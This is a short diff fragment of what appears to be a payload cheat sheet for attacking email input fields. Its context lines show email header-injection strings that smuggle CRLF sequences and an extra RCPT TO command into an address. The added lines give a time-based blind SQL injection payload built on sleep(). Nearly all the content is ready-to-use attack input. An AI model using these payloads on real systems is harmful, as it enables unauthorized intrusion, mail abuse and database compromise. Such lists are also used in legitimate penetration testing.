@@ -24,3 +24,10 @@ Header injection (Email)
 "%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
 "recipient@test.com>\r\nRCPT TO:<victim+"@test.com
 
+Blind SQLi:
+------------
+the0'XOR(if(now()=sysdate(),sleep(1),0))XOR'Z
+
+
+
+
